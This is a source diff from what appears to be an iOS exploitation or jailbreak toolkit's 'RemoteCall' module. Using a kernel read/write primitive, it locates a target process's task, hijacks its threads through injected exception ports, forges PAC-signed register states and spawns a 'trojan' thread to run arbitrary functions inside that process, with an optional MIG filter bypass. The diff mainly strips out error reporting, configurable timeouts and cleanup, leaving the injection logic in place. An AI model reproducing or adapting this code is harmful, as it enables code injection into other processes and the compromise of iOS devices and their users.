@@ -58,8 +58,6 @@ extern kern_return_t mach_vm_deallocate(task_t task, mach_vm_address_t address, 
 
 uint64_t g_RC_targetProcOverride = 0;
 uint64_t g_RC_gadgetPacia = 0;
-static __thread RemoteCallInitFailure g_RC_lastInitFailure = RemoteCallInitFailureNone;
-static __thread uint32_t g_RC_lastInitFailurePid = 0;
 
 typedef struct RemoteCallState {
     uint64_t taskAddr;
@@ -86,12 +84,9 @@ typedef struct RemoteCallState {
     uint64_t shmemUseCounter[SHMEM_CACHE_SIZE];
     uint64_t shmemClock;
     uint64_t shmemEvictions;
-    int firstExceptionTimeoutMS;
-    int stableExceptionTimeoutFloorMS;
-    bool originalThreadOnly;
 } RemoteCallState;
 
-static RemoteCallState g_RC_defaultState = { .success = true, .stableExceptionTimeoutFloorMS = 10000 };
+static RemoteCallState g_RC_defaultState = { .success = true };
 static __thread RemoteCallState *g_RC_currentState;
 
 @interface RemoteCallSession ()
@@ -141,42 +136,6 @@ static void remote_call_pop_state(RemoteCallState *previous)
 #define g_RC_shmemUseCounter       (remote_call_current_state()->shmemUseCounter)
 #define g_RC_shmemClock            (remote_call_current_state()->shmemClock)
 #define g_RC_shmemEvictions        (remote_call_current_state()->shmemEvictions)
-#define g_RC_firstExceptionTimeoutMS (remote_call_current_state()->firstExceptionTimeoutMS)
-#define g_RC_stableExceptionTimeoutFloorMS (remote_call_current_state()->stableExceptionTimeoutFloorMS)
-#define g_RC_originalThreadOnly      (remote_call_current_state()->originalThreadOnly)
-
-static void remote_call_note_init_failure(RemoteCallInitFailure failure, uint32_t pid)
-{
-    g_RC_lastInitFailure = failure;
-    g_RC_lastInitFailurePid = pid;
-}
-
-RemoteCallInitFailure remote_call_last_init_failure(void)
-{
-    return g_RC_lastInitFailure;
-}
-
-uint32_t remote_call_last_init_failure_pid(void)
-{
-    return g_RC_lastInitFailurePid;
-}
-
-const char *remote_call_init_failure_description(RemoteCallInitFailure failure)
-{
-    switch (failure) {
-        case RemoteCallInitFailureNone: return "none";
-        case RemoteCallInitFailureKRWUnavailable: return "KRW unavailable";
-        case RemoteCallInitFailureProcessMissing: return "process not found";
-        case RemoteCallInitFailureInvalidTask: return "invalid task";
-        case RemoteCallInitFailureExceptionPort: return "exception port setup failed";
-        case RemoteCallInitFailureTaskGuard: return "task EXC_GUARD setup failed";
-        case RemoteCallInitFailureLocalThread: return "local bootstrap thread setup failed";
-        case RemoteCallInitFailureNoTargetThreads: return "no injectable target threads";
-        case RemoteCallInitFailureFirstExceptionTimeout: return "target did not deliver bootstrap exception";
-        case RemoteCallInitFailureOther: return "other RemoteCall init failure";
-    }
-    return "unknown RemoteCall init failure";
-}
 
 static bool remote_call_verbose_logging(void)
 {
@@ -186,7 +145,7 @@ static bool remote_call_verbose_logging(void)
 
 static bool remote_call_should_log_result(const char *name, bool stable)
 {
-    if (remote_call_verbose_logging())
+    if (!stable || remote_call_verbose_logging())
         return true;
 
     if (!name)
@@ -257,9 +216,6 @@ static bool remote_call_should_log_result(const char *name, bool stable)
             return __sync_bool_compare_and_swap(&logOnceTable[i].logged, 0, 1);
         }
     }
-
-    if (!stable)
-        return true;
 
     return true;
 }
@@ -569,30 +525,16 @@ void sign_state(uint64_t signingThread, arm_thread_state64_internal *state, uint
     }
 }
 
-bool remote_call_current_success(void)
-{
-    return g_RC_success;
-}
-
-int remote_call_set_stable_timeout_floor_ms(int timeoutMS)
-{
-    int previous = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 10000;
-    g_RC_stableExceptionTimeoutFloorMS = timeoutMS > 0 ? timeoutMS : 10000;
-    return previous;
-}
-
 uint64_t do_remote_call_temp(int timeout, const char *name,
     uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
     uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
 {
-    int floorTimeout = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 10000;
-    int newTimeout = (floorTimeout > timeout) ? floorTimeout : timeout;
+    int newTimeout = (10000 > timeout) ? 10000 : timeout;
     uint64_t pcAddr = native_strip((uint64_t)dlsym(RTLD_DEFAULT, name));
 
     ExceptionMessage exc;
     if (!wait_exception(g_RC_firstExceptionPort, &exc, newTimeout, false)) {
         printf("[%s:%d] Don't receive first exception on original thread\n", __FUNCTION__, __LINE__);
-        g_RC_success = false;
         return 0;
     }
 
@@ -615,7 +557,6 @@ uint64_t do_remote_call_temp(int timeout, const char *name,
     ExceptionMessage exc2;
     if (!wait_exception(g_RC_firstExceptionPort, &exc2, newTimeout, false)) {
         printf("[%s:%d] Don't receive second exception on original thread\n", __FUNCTION__, __LINE__);
-        g_RC_success = false;
         return 0;
     }
     uint64_t retValue = exc2.threadState.__x[0];
@@ -640,7 +581,6 @@ uint64_t do_remote_call_stable(int timeout, const char *name,
     uint64_t pcAddr = (uint64_t)dlsym(RTLD_DEFAULT, name);
     if (!pcAddr) {
         printf("[%s:%d] Unable to find symbol: %s\n", __FUNCTION__, __LINE__, name);
-        g_RC_success = false;
         return 0;
     }
     return do_remote_call_stable_addr(timeout, pcAddr, name, x0, x1, x2, x3, x4, x5, x6, x7);
@@ -655,16 +595,13 @@ uint64_t do_remote_call_stable_addr(int timeout, uint64_t pcAddr, const char *na
 
     if (!pcAddr) {
         printf("[%s:%d] NULL function pointer: %s\n", __FUNCTION__, __LINE__, name ?: "(addr-call)");
-        g_RC_success = false;
         return 0;
     }
-    int floorTimeout = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 10000;
-    int newTimeout = (floorTimeout > timeout) ? floorTimeout : timeout;
+    int newTimeout = (10000 > timeout) ? 10000 : timeout;
 
     ExceptionMessage exc;
     if (!wait_exception(g_RC_secondExceptionPort, &exc, newTimeout, false)) {
         printf("[%s:%d] Don't receive first exception on new thread\n", __FUNCTION__, __LINE__);
-        g_RC_success = false;
         return 0;
     }
 
@@ -687,7 +624,6 @@ uint64_t do_remote_call_stable_addr(int timeout, uint64_t pcAddr, const char *na
     ExceptionMessage exc2;
     if (!wait_exception(g_RC_secondExceptionPort, &exc2, newTimeout, false)) {
         printf("[%s:%d] Don't receive second exception on new thread\n", __FUNCTION__, __LINE__);
-        g_RC_success = false;
         return 0;
     }
     uint64_t retValue = exc2.threadState.__x[0];
@@ -700,11 +636,8 @@ uint64_t do_remote_call_stable_addr(int timeout, uint64_t pcAddr, const char *na
 bool restore_trojan_thread(arm_thread_state64_internal *state)
 {
     ExceptionMessage exc;
-    int restoreTimeoutMS = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 20000;
-    if (restoreTimeoutMS < 1000) restoreTimeoutMS = 1000;
-    if (!wait_exception(g_RC_firstExceptionPort, &exc, restoreTimeoutMS, false)) {
-        printf("[%s:%d] Failed to receive exception while restoring within %dms\n",
-               __FUNCTION__, __LINE__, restoreTimeoutMS);
+    if (!wait_exception(g_RC_firstExceptionPort, &exc, 20000, false)) {
+        printf("[%s:%d] Failed to receive exception while restoring\n", __FUNCTION__, __LINE__);
         return false;
     }
     
@@ -1011,12 +944,10 @@ uint64_t retry_first_thread(bool useMigFilterBypass) {
 // NOTE: Do not run this function while "attaching xcode" on iOS 18+, it will make device unstable.
 int init_remote_call(const char* process, bool useMigFilterBypass) {
     clear_remote_shmem_cache();
-    remote_call_note_init_failure(RemoteCallInitFailureNone, 0);
 
     if (!kexploit_krw_ready()) {
         printf("[%s:%d] KRW unavailable; refusing RemoteCall init for %s\n",
                __FUNCTION__, __LINE__, process);
-        remote_call_note_init_failure(RemoteCallInitFailureKRWUnavailable, 0);
         return -1;
     }
     
@@ -1032,16 +963,13 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     if (!procAddr || procAddr == (uint64_t)-1 || !is_kaddr_valid(procAddr + off_proc_p_pid)) {
         printf("[%s:%d] process not found or invalid: %s proc=%#llx\n",
                __FUNCTION__, __LINE__, process, procAddr);
-        remote_call_note_init_failure(RemoteCallInitFailureProcessMissing, 0);
         return -1;
     }
-    uint32_t targetPid = kread32(procAddr + off_proc_p_pid);
-    printf("[%s:%d] process: %s, pid: %u\n",  __FUNCTION__, __LINE__, process, targetPid);
+    printf("[%s:%d] process: %s, pid: %u\n",  __FUNCTION__, __LINE__, process, kread32(procAddr + off_proc_p_pid));
     g_RC_taskAddr = proc_task(procAddr);
     if (!g_RC_taskAddr || !is_kaddr_valid(g_RC_taskAddr)) {
         printf("[%s:%d] invalid task for process %s proc=%#llx task=%#llx\n",
                __FUNCTION__, __LINE__, process, procAddr, g_RC_taskAddr);
-        remote_call_note_init_failure(RemoteCallInitFailureInvalidTask, targetPid);
         return -1;
     }
 
@@ -1049,7 +977,6 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     if (!selfTask || !is_kaddr_valid(selfTask)) {
         printf("[%s:%d] invalid self task while preparing %s RemoteCall task=%#llx\n",
                __FUNCTION__, __LINE__, process, selfTask);
-        remote_call_note_init_failure(RemoteCallInitFailureInvalidTask, targetPid);
         return -1;
     }
     printf("[%s:%d] targetTask=%#llx selfTask=%#llx\n",
@@ -1065,7 +992,6 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         printf("[%s:%d] Couldn't create exception ports\n", __FUNCTION__, __LINE__);
         destroy_exception_port(firstExceptionPort);
         destroy_exception_port(secondExceptionPort);
-        remote_call_note_init_failure(RemoteCallInitFailureExceptionPort, targetPid);
         return -1;
     }
     
@@ -1075,7 +1001,6 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
                __FUNCTION__, __LINE__, process, g_RC_taskAddr);
         destroy_exception_port(firstExceptionPort);
         destroy_exception_port(secondExceptionPort);
-        remote_call_note_init_failure(RemoteCallInitFailureTaskGuard, targetPid);
         return -1;
     }
     
@@ -1097,7 +1022,6 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
                __FUNCTION__, __LINE__);
         destroy_exception_port(firstExceptionPort);
         destroy_exception_port(secondExceptionPort);
-        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
         return -1;
     }
     printf("[%s:%d] creating local dummy thread for RemoteCall bootstrap\n",
@@ -1108,7 +1032,6 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
                __FUNCTION__, __LINE__, dummyErr, dummyThread);
         destroy_exception_port(firstExceptionPort);
         destroy_exception_port(secondExceptionPort);
-        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
         return -1;
     }
     mach_port_t dummyThreadMach = pthread_mach_thread_np(dummyThread);
@@ -1118,7 +1041,6 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         pthread_cancel(dummyThread);
         destroy_exception_port(firstExceptionPort);
         destroy_exception_port(secondExceptionPort);
-        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
         return -1;
     }
     printf("[%s:%d] dummyThreadMach=0x%x\n",
@@ -1131,7 +1053,6 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         mach_port_deallocate(mach_task_self_, dummyThreadMach);
         destroy_exception_port(firstExceptionPort);
         destroy_exception_port(secondExceptionPort);
-        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
         return -1;
     }
     printf("[%s:%d] dummyThreadAddr=%#llx\n",
@@ -1144,7 +1065,6 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         mach_port_deallocate(mach_task_self_, dummyThreadMach);
         destroy_exception_port(firstExceptionPort);
         destroy_exception_port(secondExceptionPort);
-        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
         return -1;
     }
     printf("[%s:%d] dummyThreadTro=%#llx\n",
@@ -1159,7 +1079,6 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         mach_port_deallocate(mach_task_self_, threadSelf);
         destroy_exception_port(firstExceptionPort);
         destroy_exception_port(secondExceptionPort);
-        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
         return -1;
     }
     uint32_t selfThreadCtid = kread32(selfThreadAddr + off_thread_ctid);
@@ -1192,7 +1111,6 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     if (!firstThread || !is_kaddr_valid(firstThread)) {
         printf("[%s:%d] invalid first thread for process %s task=%#llx firstThread=%#llx\n",
                __FUNCTION__, __LINE__, process, g_RC_taskAddr, firstThread);
-        remote_call_note_init_failure(RemoteCallInitFailureNoTargetThreads, targetPid);
         destroy_remote_call();
         return -1;
     }
@@ -1247,9 +1165,6 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
                 }
             }
             validThreadCount++;
-            if (successThreadCount >= targetInjectedThreadCount) {
-                break;
-            }
         } else if (task && !validThreadCount) {
             printf("[%s:%d] Got weird tro on first thread, resetting\n", __FUNCTION__, __LINE__);
             firstThread = retry_first_thread(useMigFilterBypass);
@@ -1282,25 +1197,14 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     
     if (g_RC_threadList.count == 0) {
         printf("[%s:%d] Exception injection failed. Aborting.\n", __FUNCTION__, __LINE__);
-        remote_call_note_init_failure(RemoteCallInitFailureNoTargetThreads, targetPid);
-        abandon_remote_call();
+        destroy_remote_call();
         return -1;
     }
     
     ExceptionMessage exc;
-    int firstExceptionTimeoutMS = g_RC_firstExceptionTimeoutMS > 0 ? g_RC_firstExceptionTimeoutMS : 120000;
-    if (firstExceptionTimeoutMS != 120000) {
-        printf("[%s:%d] First exception wait timeout=%dms\n",
-               __FUNCTION__, __LINE__, firstExceptionTimeoutMS);
-    }
-    if(!wait_exception(firstExceptionPort, &exc, firstExceptionTimeoutMS, false)) {
-        printf("[%s:%d] Failed to receive first exception within %dms\n",
-               __FUNCTION__, __LINE__, firstExceptionTimeoutMS);
-        for (NSNumber *thread in g_RC_threadList) {
-            clear_guard_exception(thread.unsignedLongLongValue);
-        }
-        remote_call_note_init_failure(RemoteCallInitFailureFirstExceptionTimeout, targetPid);
-        abandon_remote_call();
+    if(!wait_exception(firstExceptionPort, &exc, 120000, false)) {
+        printf("[%s:%d] Failed to receive first exception\n", __FUNCTION__, __LINE__);
+        destroy_remote_call();
         return -1;
     }
     
@@ -1323,68 +1227,21 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     arm_thread_state64_internal newState = exc.threadState;
     sign_state(g_RC_trojanThreadAddr, &newState, FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR);
     reply_with_state(&exc, &newState);
-
-    if (g_RC_originalThreadOnly) {
-        g_RC_creatingExtraThread = false;
-        g_RC_vmMap = task_get_vm_map(g_RC_taskAddr);
-        g_RC_pid = (int)targetPid;
-        g_RC_success = true;
-        printf("[%s:%d] Original-thread-only RemoteCall ready; skipping synthetic pthread\n",
-               __FUNCTION__, __LINE__);
-        return 0;
-    }
     
     uint64_t trojanMemTemp = ((uint64_t)exc.threadState.__sp & 0x7fffffffffULL) - 0x100ULL;
     printf("[%s:%d] trojanMemTemp: 0x%llx\n", __FUNCTION__, __LINE__, trojanMemTemp);
     g_RC_vmMap = task_get_vm_map(g_RC_taskAddr);
-    g_RC_success = true;
     
     uint64_t remoteCrashSigned = remote_pac(g_RC_trojanThreadAddr, FAKE_PC_TROJAN, 0);
-    uint64_t bootstrapPid = do_remote_call_temp(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0); // for testing
-    if (!g_RC_success || bootstrapPid == 0) {
-        printf("[%s:%d] bootstrap getpid failed before synthetic thread creation\n",
-               __FUNCTION__, __LINE__);
-        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
-        abandon_remote_call();
-        return -1;
-    }
-
-    uint64_t createResult = do_remote_call_temp(100, "pthread_create_suspended_np", trojanMemTemp, 0, remoteCrashSigned, 0, 0, 0, 0, 0);
-    if (!g_RC_success || createResult != 0) {
-        printf("[%s:%d] pthread_create_suspended_np remote call failed result=%llu\n",
-               __FUNCTION__, __LINE__, createResult);
-        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
-        abandon_remote_call();
-        return -1;
-    }
+    do_remote_call_temp(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0); // for testing
+    do_remote_call_temp(100, "pthread_create_suspended_np", trojanMemTemp, 0, remoteCrashSigned, 0, 0, 0, 0, 0);
     
     printf("[%s:%d] trojanMemTemp: 0x%llx\n", __FUNCTION__, __LINE__, trojanMemTemp);
     uint64_t pthreadAddr    = remote_read64(trojanMemTemp);
     printf("[%s:%d] pthreadAddr: 0x%llx\n", __FUNCTION__, __LINE__, pthreadAddr);
-    if (!pthreadAddr) {
-        printf("[%s:%d] pthread_create_suspended_np did not write a pthread pointer\n",
-               __FUNCTION__, __LINE__);
-        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
-        abandon_remote_call();
-        return -1;
-    }
     uint64_t callThreadPort = do_remote_call_temp(100, "pthread_mach_thread_np", pthreadAddr, 0, 0, 0, 0, 0, 0, 0);
     printf("[%s:%d] callThreadPort: 0x%llx\n", __FUNCTION__, __LINE__, callThreadPort);
-    if (!g_RC_success || !callThreadPort) {
-        printf("[%s:%d] pthread_mach_thread_np remote call failed\n",
-               __FUNCTION__, __LINE__);
-        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
-        abandon_remote_call();
-        return -1;
-    }
     g_RC_callThreadAddr = task_get_ipc_port_kobject(g_RC_taskAddr, (mach_port_t)callThreadPort);
-    if (!is_kaddr_valid(g_RC_callThreadAddr)) {
-        printf("[%s:%d] failed to resolve synthetic thread kobject port=0x%llx addr=%#llx\n",
-               __FUNCTION__, __LINE__, callThreadPort, g_RC_callThreadAddr);
-        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
-        abandon_remote_call();
-        return -1;
-    }
     
     if(useMigFilterBypass)
         mig_bypass_resume();
@@ -1434,51 +1291,11 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     return 0;
 }
 
-int init_remote_call_with_first_exception_timeout(const char* process, bool useMigFilterBypass, int firstExceptionTimeoutMS)
-{
-    RemoteCallState *state = remote_call_current_state();
-    int previousTimeout = state->firstExceptionTimeoutMS;
-    state->firstExceptionTimeoutMS = firstExceptionTimeoutMS > 0 ? firstExceptionTimeoutMS : previousTimeout;
-    int result = init_remote_call(process, useMigFilterBypass);
-    state->firstExceptionTimeoutMS = previousTimeout;
-    return result;
-}
-
-int init_remote_call_original_thread_only_with_first_exception_timeout(const char* process, bool useMigFilterBypass, int firstExceptionTimeoutMS)
-{
-    RemoteCallState *state = remote_call_current_state();
-    bool previousOriginalThreadOnly = state->originalThreadOnly;
-    state->originalThreadOnly = true;
-    int result = init_remote_call_with_first_exception_timeout(process, useMigFilterBypass, firstExceptionTimeoutMS);
-    state->originalThreadOnly = previousOriginalThreadOnly;
-    return result;
-}
-
 @implementation RemoteCallSession {
     RemoteCallState _state;
 }
 
 - (instancetype)initWithProcess:(NSString *)process useMigFilterBypass:(BOOL)useMigFilterBypass
-{
-    return [self initWithProcess:process
-              useMigFilterBypass:useMigFilterBypass
-         firstExceptionTimeoutMS:120000];
-}
-
-- (instancetype)initWithProcess:(NSString *)process
-              useMigFilterBypass:(BOOL)useMigFilterBypass
-         firstExceptionTimeoutMS:(int)firstExceptionTimeoutMS
-{
-    return [self initWithProcess:process
-              useMigFilterBypass:useMigFilterBypass
-         firstExceptionTimeoutMS:firstExceptionTimeoutMS
-              originalThreadOnly:NO];
-}
-
-- (instancetype)initWithProcess:(NSString *)process
-              useMigFilterBypass:(BOOL)useMigFilterBypass
-         firstExceptionTimeoutMS:(int)firstExceptionTimeoutMS
-              originalThreadOnly:(BOOL)originalThreadOnly
 {
     self = [super init];
     if (!self)
@@ -1487,9 +1304,6 @@ int init_remote_call_original_thread_only_with_first_exception_timeout(const cha
     memset(&_state, 0, sizeof(_state));
     _state.success = true;
     _state.threadList = [NSMutableArray new];
-    _state.firstExceptionTimeoutMS = firstExceptionTimeoutMS > 0 ? firstExceptionTimeoutMS : 120000;
-    _state.stableExceptionTimeoutFloorMS = 10000;
-    _state.originalThreadOnly = originalThreadOnly;
 
     const char *processName = process.UTF8String;
     if (!processName)
@@ -1497,24 +1311,12 @@ int init_remote_call_original_thread_only_with_first_exception_timeout(const cha
 
     RemoteCallState *previous = remote_call_push_state(&_state);
     int result = init_remote_call(processName, useMigFilterBypass);
-    if (result != 0) {
-        abandon_remote_call();
-    }
     remote_call_pop_state(previous);
 
     if (result != 0)
         return nil;
 
     return self;
-}
-
-- (void)dealloc
-{
-    RemoteCallState *previous = remote_call_push_state(&_state);
-    if (remote_call_has_local_state()) {
-        destroy_remote_call();
-    }
-    remote_call_pop_state(previous);
 }
 
 - (uint64_t)taskAddr
